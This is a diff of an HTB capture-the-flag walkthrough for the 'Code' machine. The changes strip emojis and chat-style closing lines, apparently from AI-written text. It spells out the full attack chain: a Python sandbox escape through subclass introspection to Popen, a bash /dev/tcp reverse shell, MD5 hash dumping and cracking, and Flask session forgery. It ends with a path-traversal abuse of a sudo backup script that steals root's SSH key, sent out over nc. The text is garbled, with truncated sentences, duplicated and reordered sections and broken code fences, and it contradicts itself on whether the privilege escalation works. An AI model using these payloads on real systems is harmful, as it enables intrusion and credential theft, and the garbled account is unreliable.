@@ -1,13 +1,13 @@
 # HTB Walkthrough: Deep Obfuscated RCE via Python Code Editor on Port 5000
 
-## 🧭 Step 1: Initial Enumeration with Nmap
+## Step 1: Initial Enumeration with Nmap
 
 ```bash
 nmap -sV -sC 10.129.231.240
 ```
 
 **Result:**
-```
+```text
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1
 5000/tcp open  http    Gunicorn 20.0.4
@@ -18,7 +18,7 @@ PORT     STATE SERVICE VERSION
 
 ---
 
-## 🧪 Step 2: Sanity Check — Does Code Execution Work?
+## Step 2: Sanity Check — Does Code Execution Work?
 
 Tested this:
 
@@ -26,11 +26,11 @@ Tested this:
 print("test")
 ```
 
-✅ Output showed `"test"` — this proved **some level of live code execution was working**.
+ Output showed `"test"` — this proved **some level of live code execution was working**.
 
 ---
 
-## ❌ Step 3: Tried Direct RCE Methods (Blocked by Sandbox)
+## Step 3: Tried Direct RCE Methods (Blocked by Sandbox)
 
 ### Tried:
 ```python
@@ -38,7 +38,7 @@ import os
 os.system("id")
 ```
 
-❌ Result: "Use of restricted keyword is not allowed"
+ Result: "Use of restricted keyword is not allowed"
 
 The application is clearly filtering or rejecting dangerous keywords like:
 - `import`
@@ -53,11 +53,11 @@ The application is clearly filtering or rejecting dangerous keywords like:
 __import__('os').system('id')
 ```
 
-❌ Also blocked — confirms it’s **filtering even obfuscated or indirect access to imports**.
+ Also blocked — confirms it’s **filtering even obfuscated or indirect access to imports**.
 
 ---
 
-## 🧠 Step 4: Obfuscated Enumeration — Class Subclass Bypass
+## Step 4: Obfuscated Enumeration — Class Subclass Bypass
 
 When `import` and `exec` are blocked, the next step is to leverage Python’s introspection:
 
@@ -70,7 +70,7 @@ for i, cls in enumerate((0).__class__.__base__.__subclasses__()):
         pass
 ```
 
-✅ This dumped a list of all classes currently in memory — **bypassing import entirely**, using Python’s internal class hierarchy.
+ This dumped a list of all classes currently in memory — **bypassing import entirely**, using Python’s internal class hierarchy.
 
 ### Key Output:
 ```text
@@ -81,7 +81,7 @@ At index 317 was the class `Popen` from `subprocess`. This was our **gateway to 
 
 ---
 
-## 🧪 Step 5: Proved Execution with `Popen` (But Output Not Visible)
+## Step 5: Proved Execution with `Popen` (But Output Not Visible)
 
 Ran:
 ```python
@@ -89,31 +89,31 @@ Ran:
 print("hey")
 ```
 
-✅ Output only showed: `hey`
+ Output only showed: `hey`
 
-🧩 Troubleshooting:
+ Troubleshooting:
 - We confirmed the command likely executed (no crash), but `Popen` doesn’t show output by default.
 - We needed to **capture stdout** explicitly.
 
 ---
 
-## 🔍 Step 6: Captured Output of Command
+## Step 6: Captured Output of Command
 
 Used:
 ```python
 print((0).__class__.__base__.__subclasses__()[317]('whoami', shell=True, stdout=-1).communicate()[0].decode())
 ```
 
-✅ Output:
-```
+ Output:
+```text
 app-production
 ```
 
-🎯 Success: This printed the output of the `whoami` command, confirming we could run **arbitrary system commands and capture their output**.
+ Success: This printed the output of the `whoami` command, confirming we could run **arbitrary system commands and capture their output**.
 
 ---
 
-## 🐚 Step 7: Spawned a Reverse Shell Using the Same Technique
+## Step 7: Spawned a Reverse Shell Using the Same Technique
 
 ### On Kali (listener setup):
 ```bash
@@ -125,13 +125,13 @@ nc -lvnp 4444
 (0).__class__.__base__.__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'", shell=True)
 ```
 
-> 🔁 Replace `10.10.14.XX` with your Kali IP address.
+>  Replace `10.10.14.XX` with your Kali IP address.
 
-✅ This connected back as user: `app-production`
+ This connected back as user: `app-production`
 
 ---
 
-## 🧱 Troubleshooting Reverse Shell (What Could Have Gone Wrong)
+## Troubleshooting Reverse Shell (What Could Have Gone Wrong)
 
 | Problem | Symptom | Fix |
 |--------|---------|-----|
@@ -140,11 +140,11 @@ nc -lvnp 4444
 | Payload blocked | If even obfuscated payload fails | Encode with Base64 and `exec(base64.b64decode(...))` (but `exec` may be blocked too) |
 | App crashes | Likely invali
 
-## 🧨 Post-RCE Enumeration and Exploitation (Continued)
+## Post-RCE Enumeration and Exploitation (Continued)
 
 ---
 
-### ✅ Extracted Real SQLite Database
+### Extracted Real SQLite Database
 
 After discovering `/run_code` RCE via `exec()` bypass, we pivoted to data extraction:
 
@@ -154,7 +154,7 @@ find / -name "*.db" 2>/dev/null
 
 This revealed the real app DB at:
 
-```
+```text
 /home/app-production/app/instance/database.db
 ```
 
@@ -164,7 +164,7 @@ We queried the `user` table directly:
 sqlite3 instance/database.db "SELECT id, username, password FROM user;"
 ```
 
-✅ Output:
+ Output:
 
 | ID | Username      | MD5 Password Hash                     |
 |----|---------------|----------------------------------------|
@@ -175,7 +175,7 @@ These are unsalted **MD5** hashes — extremely weak.
 
 ---
 
-### 🔐 Password Cracking (Offline via John)
+### Password Cracking (Offline via John)
 
 Created a hash file on Kali:
 
@@ -194,7 +194,7 @@ Waiting for cracked credentials to login or escalate further.
 
 ---
 
-### 🔏 Flask Session Forgery (No Password Needed)
+### Flask Session Forgery (No Password Needed)
 
 From `app.py`, we confirmed the Flask `SECRET_KEY`:
 
@@ -212,39 +212,37 @@ This session identifies as `development` (likely admin). Can now bypass login an
 
 ---
 
-### 🧠 Takeaway So Far
+### Takeaway So Far
 
 | Objective                         | Status  | Notes                                    |
 |----------------------------------|---------|------------------------------------------|
-| Code execution via `/run_code`   | ✅       | Used subclass+exec RCE bypass            |
-| Locate real DB                   | ✅       | Found at `instance/database.db`          |
-| Extract user data                | ✅       | Dumped usernames + MD5 hashes            |
-| Crack MD5 passwords              | 🕐       | In progress (using `john`)               |
-| Forge Flask session              | ✅       | Can impersonate any user (e.g. ID 1)     |
+| Code execution via `/run_code`   |        | Used subclass+exec RCE bypass            |
+| Locate real DB                   |        | Found at `instance/database.db`          |
+| Extract user data                |        | Dumped usernames + MD5 hashes            |
+| Crack MD5 passwords              |        | In progress (using `john`)               |
+| Forge Flask session              |        | Can impersonate any user (e.g. ID 1)     |
 
 ---
 
-### 🔜 Next Targets
+### Next Targets
 
 - Login or session-hijack as user ID 1 (admin)
 - Check if `/codes` or `/save_code` gives access to sensitive content
 - Attempt privilege escalation (via `sudo`, Docker breakout, or writable crons)
 - Gain full root access on host
 
-Let me know when the password cracks finish or if you'd like to continue with escalation!
-
-# 🔓 HTB Walkthrough: Post-RCE Enumeration and Privilege Escalation Attempt via `backy.sh`
+# HTB Walkthrough: Post-RCE Enumeration and Privilege Escalation Attempt via `backy.sh`
 
 ---
 
-## 🧍 Step 8: SSH Access as `martin` (Post-Hash Crack)
+## Step 8: SSH Access as `martin` (Post-Hash Crack)
 
 Once the MD5 hash for `martin` was cracked (`nafeelswordsmaster`), SSH access was obtained:
 
 ssh martin@10.129.231.240
-✅ You successfully gained a shell as martin.
+ You successfully gained a shell as martin.
 
-🔍 Step 9: Privilege Escalation Enumeration
+ Step 9: Privilege Escalation Enumeration
 Checked sudo permissions:
 
 bash
@@ -260,7 +258,7 @@ User martin may run the following commands on localhost:
     (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
 This means martin can run /usr/bin/backy.sh as root without a password.
 
-📜 Step 10: Review /usr/bin/backy.sh
+ Step 10: Review /usr/bin/backy.sh
 bash
 Copy
 Edit
@@ -278,7 +276,7 @@ bash
 Copy
 Edit
 /usr/bin/backy "$json_file"
-❌ Step 11: Blocked Path Attempts
+ Step 11: Blocked Path Attempts
 Tried to archive restricted paths:
 
 json
@@ -303,7 +301,7 @@ Edit
 Only directories under /var/ and /home/ are allowed.
 This confirmed path whitelisting was enforced.
 
-✅ Step 12: Test with Valid Path
+ Step 12: Test with Valid Path
 Created a test folder:
 
 bash
@@ -331,11 +329,11 @@ Result:
 text
 Copy
 Edit
-💢 Archiving failed for: /home/martin/testdir
-❗ Archiving completed with errors
+ Archiving failed for: /home/martin/testdir
+ Archiving completed with errors
 Even though path was allowed and files existed, archiving failed.
 
-🧱 Step 13: Troubleshooting
+ Step 13: Troubleshooting
 Confirmed /usr/bin/backy is a root-owned binary with no SUID bit
 
 Tried replacing it with a payload using tee → blocked by sudo
@@ -346,23 +344,23 @@ Confirmed the tarball /home/martin/backups/test.tar.gz was not created
 
 Tried different JSON structures → same failure
 
-🔍 Why backy.sh PrivEsc Doesn’t Work
+ Why backy.sh PrivEsc Doesn’t Work
 Root Cause	Explanation
 backy.sh is just a wrapper	It passes your JSON to /usr/bin/backy
 backy runs as martin	It does not inherit root privileges
 Binary is not SUID	Even via sudo, it's not privileged inside
 Likely internal permission checks	backy probably tries to stat, read, or chown files it can’t access
 
-✅ Current State Summary
+ Current State Summary
 Objective	Status	Notes
-Reverse shell from web editor	✅	Used obfuscated Popen payload
-Found and dumped real database	✅	Used sqlite3 on instance/database.db
-Cracked MD5 passwords	✅	Cracked with john + rockyou.txt
-SSH access as martin	✅	Full shell obtained
-sudo rights to backy.sh	✅	Confirmed no password required
-PrivEsc via backy	❌	Fails silently; no output created
+Reverse shell from web editor		Used obfuscated Popen payload
+Found and dumped real database		Used sqlite3 on instance/database.db
+Cracked MD5 passwords		Cracked with john + rockyou.txt
+SSH access as martin		Full shell obtained
+sudo rights to backy.sh		Confirmed no password required
+PrivEsc via backy		Fails silently; no output created
 
-🔜 Next Steps
+ Next Steps
 Search for other writable configs, logs, or crons
 
 Explore /var for backup artifacts or logs written by backy
@@ -381,7 +379,7 @@ getcap -r / 2>/dev/null
 
 # HTB: Code — Post-Access Privilege Escalation (Full Explanation from Martin Login to Root)
 
-## 🧠 Context and Entry Point
+## Context and Entry Point
 
 After achieving initial remote code execution through the web-based Python editor, you obtained a shell as the `app-production` user. This gave access to a database file that contained user credentials. Cracking those led to the discovery of SSH credentials for another user: **`martin`**.
 
@@ -389,7 +387,7 @@ This walkthrough begins **after you have successfully logged in via SSH as `mart
 
 ---
 
-## 🔐 Step 1: SSH Into the Target as Martin
+## Step 1: SSH Into the Target as Martin
 
 After cracking `martin`’s password (e.g., from the SQLite `database.db` in `/home/app-production/app/instance/`), log into the target:
 
@@ -417,16 +415,16 @@ sudo -l
 
 You should see something like:
 
-```
+```text
 User martin may run the following commands on code:
     (ALL) NOPASSWD: /usr/bin/backy.sh
 ```
 
-> 🔍 **This means**: `martin` can execute `/usr/bin/backy.sh` with root privileges **without needing a password.**
+>  **This means**: `martin` can execute `/usr/bin/backy.sh` with root privileges **without needing a password.**
 
 ---
 
-## 🔎 Step 2: Investigate `/usr/bin/backy.sh`
+## Step 2: Investigate `/usr/bin/backy.sh`
 
 To understand how to escalate privileges, examine what the script does:
 
@@ -439,14 +437,14 @@ You'll notice that it:
 - Passes that JSON to a binary called `/usr/bin/backy`.
 - That binary then reads a set of tasks (directories to archive) and zips them to a destination folder.
 
-### 💡 Key Insight:
+### Key Insight:
 We can abuse this mechanism by **tricking it into archiving sensitive files** (like `/root/.ssh/id_rsa` or `/root/root.txt`), even though we’re not root — because **`backy` runs as root** when triggered via `sudo`.
 
 ---
 
-## 📁 Step 3: Create the Required Backup Directory
+## Step 3: Create the Required Backup Directory
 
-Let’s set up our working directory and JSON configuration file:
+Create a working directory and JSON configuration file:
 
 ```bash
 mkdir -p /home/martin/backups
@@ -480,32 +478,32 @@ Then test the script:
 sudo /usr/bin/backy.sh /home/martin/backups/task.json
 ```
 
-✅ You should see output indicating that files in `/home/martin` were archived and a `.tar.bz2` file appeared in the backups folder.
+ You should see output indicating that files in `/home/martin` were archived and a `.tar.bz2` file appeared in the backups folder.
 
-This confirms the script works — now it’s time to abuse it.
+This confirms the script executes as intended; next, test controlled arguments for privilege escalation impact.
 
 ---
 
-## 🚪 Step 4: Privilege Escalation via Path Traversal
+## Step 4: Privilege Escalation via Path Traversal
 
 Since we want to access **`/root/.ssh
     (ALL) NOPASSWD: /usr/bin/backy.sh
-```
+```text
 
 This output tells us two things:
-- ✅ You can run `/usr/bin/backy.sh` as root using `sudo`
-- ✅ You **do not need a password** to run it (NOPASSWD)
-- ✅ This is a **limited sudo access**, which makes it a potential escalation path
+-  You can run `/usr/bin/backy.sh` as root using `sudo`
+-  You **do not need a password** to run it (NOPASSWD)
+-  This is a **limited sudo access**, which makes it a potential escalation path
 
 ---
 
-## 🛠 Step 2: Understand What `backy.sh` Is
+## Step 2: Understand What `backy.sh` Is
 
-Let’s take a look at the script you’re allowed to run with root privileges:
+Review the script you may run with elevated privileges:
 
 ```bash
 cat /usr/bin/backy.sh
-```
+```text
 
 You’ll likely find that the script:
 - Accepts a JSON file as input
@@ -523,20 +521,20 @@ You’ll likely find that the script:
     "/home/martin"
   ]
 }
-```
+```text
 
 You can test this by creating the necessary directories:
 
 ```bash
 mkdir -p ~/backups
 nano ~/backups/task.json
-```
+```text
 
 Paste the JSON above into the file and then run:
 
 ```bash
 sudo /usr/bin/backy.sh ~/backups/task.json
-```
+```text
 
 This will create a backup archive in `/home/martin/backups/` of the directory `/home/martin`.
 
@@ -544,11 +542,11 @@ Check that it worked:
 
 ```bash
 ls ~/backups
-```
+```text
 
 ---
 
-## 🚩 Step 3: Locate the User Flag
+## Step 3: Locate the User Flag
 
 At this point, your goal is to retrieve the user flag.
 
@@ -556,13 +554,13 @@ Check where it’s stored:
 
 ```bash
 ls -l /home/app-production/
-```
+```text
 
 You’ll likely see:
 
 ```
 -r-------- 1 root root 33 user.txt
-```
+```text
 
 This tells us:
 - The file **exists**
@@ -575,11 +573,11 @@ Trying this will fail:
 ```bash
 cat /home/app-production/user.txt
 # Permission denied
-```
+```text
 
 ---
 
-## 🚀 Step 4: Attempt Privilege Escalation via backy.sh
+## Step 4: Attempt Privilege Escalation via backy.sh
 
 Your only allowed `sudo` action is to run `backy.sh`, which allows us to influence what the `root` user accesses, **indirectly**, via the backup system.
 
@@ -590,17 +588,17 @@ But there’s a problem:
 - The script **validates** the paths in the JSON
 - It blocks **absolute paths to `/root`**
 - Simple attempts like:
-  ```json
+```json
   "directories_to_archive": ["/root"]
-  ```
+```text
   Will be rejected or result in:
-  ```
+```
   Nothing to archive
-  ```
+```text
 
 ---
 
-## 🧙 Step 5: Path Traversal Bypass via `/var/....//root`
+## Step 5: Path Traversal Bypass via `/var/....//root`
 
 This is a **classic Golang `filepath.Clean()` bypass** using a path that *looks like* `/var`, but really resolves to `/root`.
 
@@ -617,7 +615,7 @@ cat > ~/backups/task.json << 'EOF'
   ]
 }
 EOF
-```
+```text
 
 Here’s what happens:
 - `....//` is parsed as `../`
@@ -629,115 +627,115 @@ Now run the backup:
 
 ```bash
 sudo /usr/bin/backy.sh ~/backups/task.json
-```
+```text
 
 Look for output like:
 
 ```
-📤 Archiving: [/var/....//root/.ssh]
-📥 To: /home/martin/backups ...
-📦
+ Archiving: [/var/....//root/.ssh]
+ To: /home/martin/backups ...
+
 tar: Removing leading `/var/../' from member names
 /var/../root/.ssh/id_rsa
-```
+```text
 
 ---
 
-## 🧰 Step 6: Extract the SSH Private Key for Root
+## Step 6: Extract the SSH Private Key for Root
 
 Check the output files:
 
 ```bash
 ls -l ~/backups | grep root
-```
+```text
 
 You’ll likely find:
 
 ```
 code_var_.._root_.ssh_2025_July.tar.bz2
-```
+```text
 
 Extract it:
 
 ```bash
 tar -xvjf code_var_.._root_.ssh_2025_July.tar.bz2
-```
+```text
 
 It will create:
 
 ```
 root/.ssh/id_rsa
 root/.ssh/authorized_keys
-```
+```text
 
 View the key:
 
 ```bash
 cat root/.ssh/id_rsa
-```
+```text
 
 This is the **private key for root**, which we’ll use to log in.
 
 ---
 
-## 🔁 Step 7: Transfer the SSH Key Back to Your Kali Box
+## Step 7: Transfer the SSH Key Back to Your Kali Box
 
 Open a terminal on your Kali box and start a listener:
 
 ```bash
 nc -lvnp 9001 > id_rsa
-```
+```text
 
 On the target machine (still logged in as `martin`):
 
 ```bash
 cat root/.ssh/id_rsa | nc <your_kali_ip> 9001
-```
+```text
 
 Once it’s received:
 
 ```bash
 chmod 600 id_rsa
-```
+```text
 
 You now have root’s SSH key on your machine.
 
 ---
 
-## 🚪 Step 8: Log In as Root
+## Step 8: Log In as Root
 
 Use the key to SSH into the machine:
 
 ```bash
 ssh -i id_rsa root@code.htb
-```
+```text
 
 Or if `code.htb` isn’t resolving:
 
 ```bash
 ssh -i id_rsa root@<target-IP>
-```
+```text
 
 ---
 
-## 🏁 Step 9: Capture the Flags
+## Step 9: Capture the Flags
 
-### 📍 User Flag:
+### User Flag:
 Now that you’re root:
 
 ```bash
 cat /home/app-production/user.txt
-```
+```text
 
-### 👑 Root Flag:
+### Root Flag:
 
 ```bash
 cat /root/root.txt
-```
+```text
 
 ---
 
-## ✅ Recap: Why This Worked
+## Recap: Why This Worked
 
 | Step | Action | Why it Worked |
 |------|--------|----------------|
@@ -746,9 +744,7 @@ cat /root/root.txt
 | Used path traversal | Bypassed `backy`’s path filtering | Accessed `/root/.ssh` via a fake path |
 | Extracted private key | Tar archive gave us `id_rsa` | We impersonated root |
 | SSH with private key | No password needed | We are now root |
-| Collected flags | Root can read both user and root files | Game over |
+| Collected flags | Root can read both user and root files | Objectives complete |
 
 ---
-
-Let me know if you'd like this converted into a downloadable `.md` file or bundled with screenshots.
 
